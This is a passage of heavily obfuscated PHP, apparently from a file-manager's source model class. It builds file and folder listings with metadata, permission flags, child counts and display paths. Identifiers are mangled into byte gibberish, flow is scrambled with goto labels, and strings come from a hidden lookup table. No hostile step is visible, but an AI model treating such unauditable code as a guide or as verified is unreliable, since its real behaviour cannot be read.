Input::get($C…ÑÜ“”Õˆ[429], $C…ÑÜ“”Õˆ[7], $dÎ™ Úİ»ë, array_keys($BÍäÂ§š£)); goto FƒÂç ˜„; fÒÏ”“·‹: $C…ÑÜ“”Õˆ =& $_SERVER[Â€Á›¨õ]; $dÎ™ Úİ»ë = Model($C…ÑÜ“”Õˆ[419])->get($C…ÑÜ“”Õˆ[420]); $Fó§Ëç—­ = Model($C…ÑÜ“”Õˆ[419])->get($C…ÑÜ“”Õˆ[421]); goto e‹‰ˆØì¡; FƒÂç ˜„: $D¡Ú„™¢“ = Input::get($C…ÑÜ“”Õˆ[430], $C…ÑÜ“”Õˆ[7], $Fó§Ëç—­, array_keys($eù¬Å×É«È)); if (!in_array($bİâ‘Ã Ï, array_keys($BÍäÂ§š£))) { $bİâ‘Ã Ï = $C…ÑÜ“”Õˆ[28]; } if (!in_array($D¡Ú„™¢“, array_keys($eù¬Å×É«È))) { $bİâ‘Ã Ï = $C…ÑÜ“”Õˆ[422]; } goto FÓƒº‚õ†ê; FÓƒº‚õ†ê: if ($bİâ‘Ã Ï == $C…ÑÜ“”Õˆ[28]) { } $dã†ò’ó´ = $C…ÑÜ“”Õˆ[431] . $BÍäÂ§š£[$bİâ‘Ã Ï] . $C…ÑÜ“”Õˆ[50] . $eù¬Å×É«È[$D¡Ú„™¢“]; return $this->order(rtrim(trim($dã†ò’ó´), $C…ÑÜ“”Õˆ[47])); goto aÙëÇ¸™˜¦; aÙëÇ¸™˜¦: } protected function _listDataApplyItem($B¹ºìù¢Ï·, $F¶ê£Ñ–Ã = false) { $F˜‰¬ĞŒÀ¥ = array($B¹ºìù¢Ï·); $this->_listDataApply($F˜‰¬ĞŒÀ¥, $F¶ê£Ñ–Ã); return $F˜‰¬ĞŒÀ¥[0]; } protected function _listDataApply(&$a÷¿õ´ïœÊ, $bŠ¦ÔƒÍù‡ = false) { goto CÊÒ¢¹Ö«; B¨ğÏÕ¬: $this->_listAppendPath($a÷¿õ´ïœÊ); $this->_listAppendAuth($a÷¿õ´ïœÊ); $this->_listAppendSourceInfo($a÷¿õ´ïœÊ, $f­–“ñÆ¬); goto E•ÊÁ–³í; E•ÊÁ–³í: $this->_listAppendUser($a÷¿õ´ïœÊ); $this->_listFilterInfo($a÷¿õ´ïœÊ, $bŠ¦ÔƒÍù‡); goto aÄš…åç®Ø; fÁ’˜‰½‚ç: $f­–“ñÆ¬ = array_unique($f­–“ñÆ¬); $this->_listSourceCache($a÷¿õ´ïœÊ); if (!$bŠ¦ÔƒÍù‡) { $this->_listAppendMeta($a÷¿õ´ïœÊ, $f­–“ñÆ¬); $this->_listAppendFileMeta($a÷¿õ´ïœÊ, $f­–“ñÆ¬); $this->_listAppendChildren($a÷¿õ´ïœÊ, $f­–“ñÆ¬); } goto B¨ğÏÕ¬; CÊÒ¢¹Ö«: $Aæ—±Ê‚² =& $_SERVER[Â€Á›¨õ]; if (!$a÷¿õ´ïœÊ) { $a÷¿õ´ïœÊ = array(); return; } $f­–“ñÆ¬ = array_to_keyvalue($a÷¿õ´ïœÊ, $Aæ—±Ê‚²[33], $Aæ—±Ê‚²[390]); goto fÁ’˜‰½‚ç; aÄš…åç®Ø: } protected function _listSourceCache($f÷§½š¼ƒ‘) { $C‰ƒæ©ñ›Ç =& $_SERVER[Â€Á›¨õ]; foreach ($f÷§½š¼ƒ‘ as $f†ÚÙêÇŒŒ) { self::$cacheSourceInfo[$C‰ƒæ©ñ›Ç[432] . $f†ÚÙêÇŒŒ[$C‰ƒæ©ñ›Ç[390]]] = $f†ÚÙêÇŒŒ; } } protected function _listFilterInfo(&$bãôâ©ÂÀÎ, $AêáŞøƒ = false) { $A÷ §£“˜ =& $_SERVER[Â€Á›¨õ]; foreach ($bãôâ©ÂÀÎ as &$fÜÛ»¨Œ´) { $fÜÛ»¨Œ´ = $this->pathInfoFilter($fÜÛ»¨Œ´); self::$cachePathInfo[$A÷ §£“˜[433] . intval($AêáŞøƒ) . $A÷ §£“˜[434] . $fÜÛ»¨Œ´[$A÷ §£“˜[390]]] = $fÜÛ»¨Œ´; } unset($fÜÛ»¨Œ´); } protected function _listMake(&$aŸˆ¨ÒäÅ) { $a‚÷÷©ÅÇ– =& $_SERVER[Â€Á›¨õ]; $aŸˆ¨ÒäÅ[$a‚÷÷©ÅÇ–[74]] = array(); $aŸˆ¨ÒäÅ[$a‚÷÷©ÅÇ–[73]] = array(); foreach ($aŸˆ¨ÒäÅ[$a‚÷÷©ÅÇ–[365]] as $cñÜµ¯´½ã) { $AíÖ™÷§ï¶ = $cñÜµ¯´½ã[$a‚÷÷©ÅÇ–[397]] == 1 ? $a‚÷÷©ÅÇ–[74] : $a‚÷÷©ÅÇ–[73]; $aŸˆ¨ÒäÅ[$AíÖ™÷§ï¶][] = $cñÜµ¯´½ã; } unset($aŸˆ¨ÒäÅ[$a‚÷÷©ÅÇ–[365]]); } protected function _listAppendMeta(&$d…´¨Î§¦–, $aßÓ—¡ñğ) { goto CŠå´ÄñÕ¨; CŠå´ÄñÕ¨: $DÄ¦‚±­ø =& $_SERVER[Â€Á›¨õ]; $Eİ˜™¿œĞ… = array($DÄ¦‚±­ø[404] => array($DÄ¦‚±­ø[405], $aßÓ—¡ñğ)); $cã«ŒôäÜì = Model($DÄ¦‚±­ø[435])->field($DÄ¦‚±­ø[436])->where($Eİ˜™¿œĞ…)->select(); goto E­‹®—Â§; F½Öõ¸ƒÁ¸: foreach ($cã«ŒôäÜì as $bÆçÔ®éÀÅ) { if (!isset($fÔĞâšø”[$bÆçÔ®éÀÅ[$DÄ¦‚±­ø[390]]])) { $fÔĞâšø”[$bÆçÔ®éÀÅ[$DÄ¦‚±­ø[390]]] = array(); } if (in_array($bÆçÔ®éÀÅ[$DÄ¦‚±­ø[92]], $bïÊØˆ«™)) { continue; } $fÔĞâšø”[$bÆçÔ®éÀÅ[$DÄ¦‚±­ø[390]]][$bÆçÔ®éÀÅ[$DÄ¦‚±­ø[92]]] = $bÆçÔ®éÀÅ[$DÄ¦‚±­ø[370]]; } foreach ($d…´¨Î§¦– as &$DùÁº†¸ß) { $DùÁº†¸ß[$DÄ¦‚±­ø[439]] = !1; if (isset($fÔĞâšø”[$DùÁº†¸ß[$DÄ¦‚±­ø[390]]])) { $DùÁº†¸ß[$DÄ¦‚±­ø[439]] = $fÔĞâšø”[$DùÁº†¸ß[$DÄ¦‚±­ø[390]]]; } if ($this->fileIsLock($DùÁº†¸ß) && $DùÁº†¸ß[$DÄ¦‚±­ø[400]]) { $e…“©éƒ ² = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $DùÁº†¸ß[$DÄ¦‚±­ø[400]][$DÄ¦‚±­ø[401]] = AuthModel::authDisable($DùÁº†¸ß[$DÄ¦‚±­ø[400]][$DÄ¦‚±­ø[401]], $e…“©éƒ ²); $DùÁº†¸ß[$DÄ¦‚±­ø[400]][$DÄ¦‚±­ø[440]][$DÄ¦‚±­ø[400]] = $DùÁº†¸ß[$DÄ¦‚±­ø[400]][$DÄ¦‚±­ø[401]]; } } unset($DùÁº†¸ß); goto F„ˆßˆ±™·; E­‹®—Â§: if (!$cã«ŒôäÜì) { return; } $bïÊØˆ«™ = array($DÄ¦‚±­ø[437], $DÄ¦‚±­ø[438]); $fÔĞâšø” = array(); goto F½Öõ¸ƒÁ¸; F„ˆßˆ±™·: } protected function _listAppendFileMeta(&$cËÛïô™æ, $E°™÷²íÁÃ) { goto C¼Äö¬îÄ; FŠË¾–’ìÀ: if (!$eê„öö¤ÍÏ) { return; } $c Öì‘Ï = array($bÏ“ó¬»µ[442] => array($bÏ“ó¬»µ[405], $eê„öö¤ÍÏ)); $A¢¦ÒÖ’ù = $bÏ“ó¬»µ[443]; goto A²¡Š•¸£›; A²¡Š•¸£›: $C‰êËåÖç = Model($bÏ“ó¬»µ[444])->field($A¢¦ÒÖ’ù)->where($c Öì‘Ï)->select(); $C‰êËåÖç = array_to_keyvalue($C‰êËåÖç, $bÏ“ó¬»µ[441]); $a¾³ÅŠ–ß = Model($bÏ“ó¬»µ[445])->field($bÏ“ó¬»µ[446])->where($c Öì‘Ï)->select(); goto aôôŠÃ‚˜£; fĞ¯”‰öâä: foreach ($cËÛïô™æ as &$c™Î¿ù‰Ø) { goto FßÑé‹‰­ê; dìˆøªğç»: if (isset($c™Î¿ù‰Ø[$bÏ“ó¬»µ[163]][$bÏ“ó¬»µ[162]])) { $c™Î¿ù‰Ø[$bÏ“ó¬»µ[162]] = json_decode($c™Î¿ù‰Ø[$bÏ“ó¬»µ[163]][$bÏ“ó¬»µ[162]], !0); unset($c™Î¿ù‰Ø[$bÏ“ó¬»µ[163]][$bÏ“ó¬»µ[162]]); } goto FŠ•ÚˆÅì¥; E‘•ÌåÙ¬À: unset($C‰êËåÖç[$a£ƒØÄô][$bÏ“ó¬»µ[75]]); $bÊø¢ˆÅ‘¸ = is_array($c‰œ…¸åîÕ[$a£ƒØÄô]) ? $c‰œ…¸åîÕ[$a£ƒØÄô] : array(); $c™Î¿ù‰Ø[$bÏ“ó¬»µ[163]] = array_merge($bÊø¢ˆÅ‘¸, $C‰êËåÖç[$a£ƒØÄô]); goto dìˆøªğç»; FßÑé‹‰­ê: $a£ƒØÄô = $c™Î¿ù‰Ø[$bÏ“ó¬»µ[441]]; if (!$a£ƒØÄô || !isset($C‰êËåÖç[$a£ƒØÄô])) { continue; } $b¤‚ÔŠÆ¾ñ = $C‰êËåÖç[$a£ƒØÄô]; goto FÒŒ©»×Óğ; FÒŒ©»×Óğ: $b¤‚ÔŠÆ¾ñ[$bÏ“ó¬»µ[77]] = $c™Î¿ù‰Ø[$bÏ“ó¬»µ[77]]; $b¤‚ÔŠÆ¾ñ[$bÏ“ó¬»µ[28]] = $c™Î¿ù‰Ø[$bÏ“ó¬»µ[28]]; if (!isset(self::$cacheFileInfo[$bÏ“ó¬»µ[447] . $a£ƒØÄô])) { self::$cacheFileInfo[$bÏ“ó¬»µ[447] . $a£ƒØÄô] = array_merge(array(), $b¤‚ÔŠÆ¾ñ); } goto E‘•ÌåÙ¬À; FŠ•ÚˆÅì¥: } unset($c™Î¿ù‰Ø); goto c¾Ïİ¢ï; aôôŠÃ‚˜£: $a¾³ÅŠ–ß = $a¾³ÅŠ–ß ? $a¾³ÅŠ–ß : array(); $c‰œ…¸åîÕ = array(); foreach ($a¾³ÅŠ–ß as $CéùÊÄ–ÓÙ) { if (!isset($c‰œ…¸åîÕ[$CéùÊÄ–ÓÙ[$bÏ“ó¬»µ[441]]])) { $c‰œ…¸åîÕ[$CéùÊÄ–ÓÙ[$bÏ“ó¬»µ[441]]] = array(); } $c‰œ…¸åîÕ[$CéùÊÄ–ÓÙ[$bÏ“ó¬»µ[441]]][$CéùÊÄ–ÓÙ[$bÏ“ó¬»µ[92]]] = $CéùÊÄ–ÓÙ[$bÏ“ó¬»µ[370]]; } goto fĞ¯”‰öâä; C¼Äö¬îÄ: $bÏ“ó¬»µ =& $_SERVER[Â€Á›¨õ]; $eê„öö¤ÍÏ = array_to_keyvalue($cËÛïô™æ, $bÏ“ó¬»µ[33], $bÏ“ó¬»µ[441]); $eê„öö¤ÍÏ = array_filter(array_unique($eê„öö¤ÍÏ)); goto FŠË¾–’ìÀ; c¾Ïİ¢ï: } protected function _listAppendSourceInfo(&$C«½æ¶ª¹ô, $b¢¯ìø”â) { goto B½‹†Äîµ©; B‡ò¸¾†ä: $D“‡¾ÏÍÄƒ = array_to_keyvalue_group($Få™Öù»·, $E´²’óñ÷‚[390]); foreach ($C«½æ¶ª¹ô as &$dİ³Óßø§™) { $dİ³Óßø§™[$E´²’óñ÷‚[84]] = array($E´²’óñ÷‚[451] => 0, $E´²’óñ÷‚[452] => 0, $E´²’óñ÷‚[453] => 0); if (isset($d°»¨ÎÈË[$dİ³Óßø§™[$E´²’óñ÷‚[390]]])) { $dİ³Óßø§™[$E´²’óñ÷‚[84]][$E´²’óñ÷‚[454]] = 1; $dİ³Óßø§™[$E´²’óñ÷‚[84]][$E´²’óñ÷‚[455]] = $d°»¨ÎÈË[$dİ³Óßø§™[$E´²’óñ÷‚[390]]][$E´²’óñ÷‚[28]]; } if (isset($bÓåÙØ”¯ç[$dİ³Óßø§™[$E´²’óñ÷‚[390]]])) { $dİ³Óßø§™[$E´²’óñ÷‚[84]][$E´²’óñ÷‚[456]] = array(); foreach ($bÓåÙØ”¯ç[$dİ³Óßø§™[$E´²’óñ÷‚[390]]] as $e™¬ø¤ÇğŒ) { $cÍÚßàäÓ¼ = $FË‡Ï¹öˆ¹[$e™¬ø¤ÇğŒ]; $dİ³Óßø§™[$E´²’óñ÷‚[84]][$E´²’óñ÷‚[456]][] = array($E´²’óñ÷‚[457] => $cÍÚßàäÓ¼[$E´²’óñ÷‚[388]], $E´²’óñ÷‚[407] => $cÍÚßàäÓ¼[$E´²’óñ÷‚[28]], $E´²’óñ÷‚[458] => $cÍÚßàäÓ¼[$E´²’óñ÷‚[459]]); } } if (isset($D“‡¾ÏÍÄƒ[$dİ³Óßø§™[$E´²’óñ÷‚[390]]])) { $dİ³Óßø§™[$E´²’óñ÷‚[84]][$E´²’óñ÷‚[460]] = array(); foreach ($D“‡¾ÏÍÄƒ[$dİ³Óßø§™[$E´²’óñ÷‚[390]]] as $E‚·³•§Ìâ) { $dİ³Óßø§™[$E´²’óñ÷‚[84]][$E´²’óñ÷‚[460]] = array($E´²’óñ÷‚[461] => $E‚·³•§Ìâ[$E´²’óñ÷‚[462]], $E´²’óñ÷‚[463] => $E‚·³•§Ìâ[$E´²’óñ÷‚[464]], $E´²’óñ÷‚[465] => $E‚·³•§Ìâ[$E´²’óñ÷‚[390]], $E´²’óñ÷‚[466] => $E‚·³•§Ìâ[$E´²’óñ÷‚[467]], $E´²’óñ÷‚[468] => $E‚·³•§Ìâ[$E´²’óñ÷‚[469]], $E´²’óñ÷‚[470] => $E‚·³•§Ìâ[$E´²’óñ÷‚[470]], $E´²’óñ÷‚[471] => $E‚·³•§Ìâ[$E´²’óñ÷‚[471]]); } } } unset($dİ³Óßø§™); goto cÛˆèì°; C‹ç…Å‚Ñ: $CÉ×ä ÅÅ  = Model($E´²’óñ÷‚[412])->listData(); $fìÓ‚—ŒÁÔ = Model($E´²’óñ÷‚[402])->listData(); $Få™Öù»· = Model($E´²’óñ÷‚[450])->listSimple(); goto dÈ‘í«ÑÂ; cÛˆèì°: return $C«½æ¶ª¹ô; goto E‹Û¼Ã»‡…; dÈ‘í«ÑÂ: $FË‡Ï¹öˆ¹ = array_to_keyvalue($BŒà¶ó ˜±, $E´²’óñ÷‚[388]); $bÓåÙØ”¯ç = array_to_keyvalue_group($CÉ×ä ÅÅ , $E´²’óñ÷‚[75], $E´²’óñ÷‚[413]); $d°»¨ÎÈË = array_to_keyvalue($fìÓ‚—ŒÁÔ, $E´²’óñ÷‚[75]); goto B‡ò¸¾†ä; B½‹†Äîµ©: $E´²’óñ÷‚ =& $_SERVER[Â€Á›¨õ]; if (!defined($E´²’óñ÷‚[448])) { return; } $BŒà¶ó ˜± = Model($E´²’óñ÷‚[449])->listData(); goto C‹ç…Å‚Ñ; E‹Û¼Ã»‡…: } protected function _listAppendChildren(&$fßªá„ç, $dÔÉƒªˆ•) { goto D©î§˜„ßˆ; bŠ‹¡¶İ±: $e—¦¦†ÄÓ¸ = array(); foreach ($B’êÙ½À’ as $Fø–¾œ‰‰¤) { $aµÚ¨ÔøË = $Fø–¾œ‰‰¤[$f„¡êğŒŒŞ[472]]; $BïÌ“ññ¬« = $Fø–¾œ‰‰¤[$f„¡êğŒŒŞ[397]] == $f„¡êğŒŒŞ[86] ? $f„¡êğŒŒŞ[202] : $f„¡êğŒŒŞ[201]; if (!isset($e—¦¦†ÄÓ¸[$aµÚ¨ÔøË])) { $e—¦¦†ÄÓ¸[$aµÚ¨ÔøË] = array($f„¡êğŒŒŞ[201] => 0, $f„¡êğŒŒŞ[202] => 0); } $e—¦¦†ÄÓ¸[$aµÚ¨ÔøË][$BïÌ“ññ¬«] += $Fø–¾œ‰‰¤[$f„¡êğŒŒŞ[474]]; } foreach ($fßªá„ç as &$b¼˜Çİ‰à¡) { if (!$b¼˜Çİ‰à¡[$f„¡êğŒŒŞ[397]]) { continue; } $Dßç“æ³ = is_array($e—¦¦†ÄÓ¸[$b¼˜Çİ‰à¡[$f„¡êğŒŒŞ[390]]]) ? $e—¦¦†ÄÓ¸[$b¼˜Çİ‰à¡[$f„¡êğŒŒŞ[390]]] : $dÁÔˆßŞ¹š; $b¼˜Çİ‰à¡[$f„¡êğŒŒŞ[202]] = $Dßç“æ³[$f„¡êğŒŒŞ[202]]; $b¼˜Çİ‰à¡[$f„¡êğŒŒŞ[201]] = $Dßç“æ³[$f„¡êğŒŒŞ[201]]; unset($b¼˜Çİ‰à¡[$f„¡êğŒŒŞ[399]]); } goto eôÉß°¯Ñ’; D©î§˜„ßˆ: $f„¡êğŒŒŞ =& $_SERVER[Â€Á›¨õ]; $Aİä»™Âìî = array(); $dÁÔˆßŞ¹š = array($f„¡êğŒŒŞ[201] => 0, $f„¡êğŒŒŞ[202] => 0); goto A…„¡áİ¯Ğ; eôÉß°¯Ñ’: unset($b¼˜Çİ‰à¡); goto D±‘“ÚÀÔ; A…„¡áİ¯Ğ: foreach ($fßªá„ç as &$b¼˜Çİ‰à¡) { if (!$b¼˜Çİ‰à¡[$f„¡êğŒŒŞ[397]]) { continue; } $Aİä»™Âìî[] = $b¼˜Çİ‰à¡[$f„¡êğŒŒŞ[390]]; } unset($b¼˜Çİ‰à¡); if (!$Aİä»™Âìî) { return; } goto e½ÚäíŠ¹ä; e½ÚäíŠ¹ä: $b†š·š¸éó = array($f„¡êğŒŒŞ[472] => array($f„¡êğŒŒŞ[7], $Aİä»™Âìî)); $bäœ™°øª… = array($f„¡êğŒŒŞ[472], $f„¡êğŒŒŞ[397], $f„¡êğŒŒŞ[473] => $f„¡êğŒŒŞ[474]); $B’êÙ½À’ = $this->field($bäœ™°øª…)->where($b†š·š¸éó)->group($f„¡êğŒŒŞ[475])->select(); goto bŠ‹¡¶İ±; D±‘“ÚÀÔ: } protected function _listAppendAuth(&$f¦ÜàÚïŸİ) { goto d¶İõÓÖôÖ; F»•íÈ‚‡¾: $bŸÓ¬öè˜™ = Model($d‚¿­¶ŠÉ‹[476])->getSourceList($A„ê²â‰Ïå, $aÔÆ»ÎÔ¸ì); foreach ($f¦ÜàÚïŸİ as $A«ğš®ñ„Ê => &$D®ÚŞ‰ö¡×) { $D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[400]] = $bŸÓ¬öè˜™[$D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[390]]]; if (!$D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[400]] && $D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[398]] == self::TYPE_GROUP) { $D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[400]] = Action($d‚¿­¶ŠÉ‹[477])->pathGroupAuthMake($D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[478]]); if (!$D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[400]] && !_get($GLOBALS, $d‚¿­¶ŠÉ‹[479])) { $D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[194]] = !1; $D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[193]] = !1; } } if ($D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[400]]) { $D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[194]] = AuthModel::authCheckEdit($D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[400]][$d‚¿­¶ŠÉ‹[401]]); $D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[193]] = AuthModel::authCheckView($D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[400]][$d‚¿­¶ŠÉ‹[401]]); } $this->groupPathDisplay($D®ÚŞ‰ö¡×); } unset($D®ÚŞ‰ö¡×); goto a•ø‚¢„Ğ; D¬ÓÓ¯Ë—: foreach ($f¦ÜàÚïŸİ as $D®ÚŞ‰ö¡×) { if ($D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[398]] == self::TYPE_GROUP) { $A„ê²â‰Ïå[] = $D®ÚŞ‰ö¡×[$d‚¿­¶ŠÉ‹[390]]; } } if (!$A„ê²â‰Ïå) { return; } $aÔÆ»ÎÔ¸ì = array_to_keyvalue($f¦ÜàÚïŸİ, $d‚¿­¶ŠÉ‹[390]); goto F»•íÈ‚‡¾; d¶İõÓÖôÖ: $d‚¿­¶ŠÉ‹ =& $_SERVER[Â€Á›¨õ]; if (!defined($d‚¿­¶ŠÉ‹[448])) { return; } $A„ê²â‰Ïå = array(); goto D¬ÓÓ¯Ë—; a•ø‚¢„Ğ: } public function groupPathDisplay(&$B¥–“¸åéç) { goto CÈÇ¹¸ˆß‹; EëÊã‹òà: $B¥–“¸åéç[$eçå‚¡“ç¥[486]] = $D¿¬¹”˜Ô . $Aé«ÀÆ¿“ö[$eçå‚¡“ç¥[84]][$eçå‚¡“ç¥[390]]; goto Aå‰”†Ûğ; Fõ‡ã¹ÕÄ: $B¥–“¸åéç[$eçå‚¡“ç¥[482]] = $Aé«ÀÆ¿“ö[$eçå‚¡“ç¥[472]]; $B¥–“¸åéç[$eçå‚¡“ç¥[483]] = $Aé«ÀÆ¿“ö[$eçå‚¡“ç¥[481]]; $B¥–“¸åéç[$eçå‚¡“ç¥[484]] = $Aé«ÀÆ¿“ö[$eçå‚¡“ç¥[485]]; goto EëÊã‹òà; dÙ‹™×Ç’‰: $aÔ÷¼Ûê‚ = $this->parentLevelArray($Aé«ÀÆ¿“ö[$eçå‚¡“ç¥[481]]); $D¿¬¹”˜Ô = $eçå‚¡“ç¥[33]; foreach ($aÔ÷¼Ûê‚ as $Eòœ¡Å ïù) { $dŸ×ß—‰Ô– = Model($eçå‚¡“ç¥[480])->getInfo($Eòœ¡Å ïù); $D¿¬¹”˜Ô .= $dŸ×ß—‰Ô–[$eçå‚¡“ç¥[84]][$eçå‚¡“ç¥[390]] . $eçå‚¡“ç¥[47]; } goto Fõ‡ã¹ÕÄ; CÈÇ¹¸ˆß‹: $eçå‚¡“ç¥ =& $_SERVER[Â€Á›¨õ]; if ($B¥–“¸åéç[$eçå‚¡“ç¥[398]] != self::TYPE_GROUP) { return; } $Aé«ÀÆ¿“ö = Model($eçå‚¡“ç¥[480])->getInfo($B¥–“¸åéç[$eçå‚¡“ç¥[478]]); goto dÙ‹™×Ç’‰; Aå‰”†Ûğ: } protected function _listAppendPath(&$D‰¯’¯˜’É) { goto e¸‡˜ŞƒŸò; D¨±Œ’Ì“¬: $A•í¾´Áò‚ = array(); $EÒØÃèŠÍ = array(); foreach ($D‰¯’¯˜’É as &$aæÔç–™Æ’) { goto F ¦Ë½¹¡; Cš‘¦µî†: if (intval($aæÔç–™Æ’[$FÉÇ¹õç·Ö[398]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($aæÔç–™Æ’, $a°çÍ·Ò¨‡, $bÛó¹†İœ¢); } goto B™å¿×‹–å; F ¦Ë½¹¡: $F·Àˆ–²°¡ = $aæÔç–™Æ’[$FÉÇ¹õç·Ö[481]]; if (isset($EÒØÃèŠÍ[$F·Àˆ–²°¡])) { $E ÍŸéÑ¢… = $A•í¾´Áò‚[$F·Àˆ–²°¡]; } else { $a°çÍ·Ò¨‡ = $this->parentLevelArray($aæÔç–™Æ’[$FÉÇ¹õç·Ö[481]]); $DÕ±ÙÜ÷íÊ = $FÉÇ¹õç·Ö[488] . $aæÔç–™Æ’[$FÉÇ¹õç·Ö[398]] . $FÉÇ¹õç·Ö[434] . $aæÔç–™Æ’[$FÉÇ¹õç·Ö[478]]; if ($A•í¾´Áò‚[$DÕ±ÙÜ÷íÊ]) { $E ÍŸéÑ¢… = $A•í¾´Áò‚[$DÕ±ÙÜ÷íÊ]; } else { $E ÍŸéÑ¢… = $this->_listAppendPathRoot($aæÔç–™Æ’, $a°çÍ·Ò¨‡); $A•í¾´Áò‚[$DÕ±ÙÜ÷íÊ] = $E ÍŸéÑ¢…; } foreach ($a°çÍ·Ò¨‡ as $A«§ˆÙÃÔ => $Aâ°£¡°ª§) { if ($A«§ˆÙÃÔ == 0 && $E ÍŸéÑ¢… && $aæÔç–™Æ’[$FÉÇ¹õç·Ö[398]] == self::TYPE_GROUP) { continue; } if (isset($B•ÊŞ·ö†‰[$Aâ°£¡°ª§])) { $E ÍŸéÑ¢… .= $B•ÊŞ·ö†‰[$Aâ°£¡°ª§] . $FÉÇ¹õç·Ö[8]; } } if ($a°çÍ·Ò¨‡) { $E ÍŸéÑ¢… .= $aæÔç–™Æ’[$FÉÇ¹õç·Ö[28]]; } $A•í¾´Áò‚[$F·Àˆ–²°¡] = $E ÍŸéÑ¢…; } if ($aæÔç–™Æ’[$FÉÇ¹õç·Ö[397]]) { $E ÍŸéÑ¢… .= $FÉÇ¹õç·Ö[8]; } goto DáÀäĞÇÅÒ; DáÀäĞÇÅÒ: $aæÔç–™Æ’[$FÉÇ¹õç·Ö[489]] = str_replace($FÉÇ¹õç·Ö[490], $FÉÇ¹õç·Ö[8], $E ÍŸéÑ¢…); $eòÓÉªÇğ = trim($aæÔç–™Æ’[$FÉÇ¹õç·Ö[489]], $FÉÇ¹õç·Ö[8]); if ($aæÔç–™Æ’[$FÉÇ¹õç·Ö[472]] == $FÉÇ¹õç·Ö[491] && $eòÓÉªÇğ) { $aæÔç–™Æ’[$FÉÇ¹õç·Ö[28]] = $eòÓÉªÇğ; } goto Cš‘¦µî†; B™å¿×‹–å: } goto c¤ºğàÀëæ; c¤ºğàÀëæ: unset($aæÔç–™Æ’); return $D‰¯’¯˜’É; goto D¬ÂÁ„‚Œ†; AÓ¿¶ ‚Ò: $Dö‘×¿®“Ø = array_unique($Dö‘×¿®“Ø); if (count($Dö‘×¿®“Ø) > 0) { $b ¹áÑ‰‹Æ = array($FÉÇ¹õç·Ö[404] => array($FÉÇ¹õç·Ö[405], $Dö‘×¿®“Ø)); if (count($Dö‘×¿®“Ø) == 1) { $eÎ ØÀ„Í = $this->sourceInfo($Dö‘×¿®“Ø[0]); $a¬õ…†ÑåÆ = is_array($eÎ ØÀ„Í) ? array($eÎ ØÀ„Í) : !1; } else { $a¬õ…†ÑåÆ = $this->field($FÉÇ¹õç·Ö[487])->where($b ¹áÑ‰‹Æ)->select(); } if (!$a¬õ…†ÑåÆ) { $a¬õ…†ÑåÆ = array(); } foreach ($a¬õ…†ÑåÆ as $C­²¢Ò–ÁĞ) { $B•ÊŞ·ö†‰[$C­²¢Ò–ÁĞ[$FÉÇ¹õç·Ö[390]]] = $C­²¢Ò–ÁĞ[$FÉÇ¹õç·Ö[28]]; } } $bÛó¹†İœ¢ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto D¨±Œ’Ì“¬; e¸‡˜ŞƒŸò: $FÉÇ¹õç·Ö =& $_SERVER[Â€Á›¨õ]; static $B•ÊŞ·ö†‰ = array(); $Dö‘×¿®“Ø = array(); goto eÂõøóÔ¿Ñ; eÂõøóÔ¿Ñ: $Fõ »ç‡ = array(); foreach ($D‰¯’¯˜’É as &$aæÔç–™Æ’) { $C¨Èø„œ¥à = $aæÔç–™Æ’[$FÉÇ¹õç·Ö[397]] == $FÉÇ¹õç·Ö[86]; if ($C¨Èø„œ¥à) { $B•ÊŞ·ö†‰[$aæÔç–™Æ’[$FÉÇ¹õç·Ö[390]]] = $aæÔç–™Æ’[$FÉÇ¹õç·Ö[28]]; } if (isset($Fõ »ç‡[$aæÔç–™Æ’[$FÉÇ¹õç·Ö[481]]])) { continue; } $Fõ »ç‡[$aæÔç–™Æ’[$FÉÇ¹õç·Ö[481]]] = !0; $a°çÍ·Ò¨‡ = $this->parentLevelArray($aæÔç–™Æ’[$FÉÇ¹õç·Ö[481]]); foreach ($a°çÍ·Ò¨‡ as $A«§ˆÙÃÔ => $Aâ°£¡°ª§) { if ($A«§ˆÙÃÔ != 0 && !isset($B•ÊŞ·ö†‰[$Aâ°£¡°ª§])) { $Dö‘×¿®“Ø[] = $Aâ°£¡°ª§; } } } unset($aæÔç–™Æ’); goto AÓ¿¶ ‚Ò; D¬ÂÁ„‚Œ†: } private function _listAppendPathRecycle(&$dœ®Å÷ŸÙÕ, $bö‡‰½×¬Ş, $c¨‡àÔÇ‹Å) { goto c²ÏÓÉ™İ; c²ÏÓÉ™İ: $BƒÚœçØ´ =& $_SERVER[Â€Á›¨õ]; if (!in_array($c¨‡àÔÇ‹Å, $bö‡‰½×¬Ş) && $dœ®Å÷ŸÙÕ[$BƒÚœçØ´[390]] != $c¨‡àÔÇ‹Å) { return; } $eÊÅÉÊá·¥ = explode($BƒÚœçØ´[8], trim($dœ®Å÷ŸÙÕ[$BƒÚœçØ´[489]], $BƒÚœçØ´[8])); goto BùˆªŒ÷µ×; aÛËÂÛ Ø: if ($dœ®Å÷ŸÙÕ[$BƒÚœçØ´[390]] == $c¨‡àÔÇ‹Å) { $dœ®Å÷ŸÙÕ[$BƒÚœçØ´[481]] = $BƒÚœçØ´[493]; $dœ®Å÷ŸÙÕ[$BƒÚœçØ´[472]] = $BƒÚœçØ´[491]; $dœ®Å÷ŸÙÕ[$BƒÚœçØ´[28]] = LNG($BƒÚœçØ´[492]); } $dœ®Å÷ŸÙÕ[$BƒÚœçØ´[494]] = $BƒÚœçØ´[495]; goto cƒŠñ†»‰Ğ; BùˆªŒ÷µ×: $DÊ§ÎÄØ©¬ = implode($BƒÚœçØ´[8], array_slice($eÊÅÉÊá·¥, 2)); 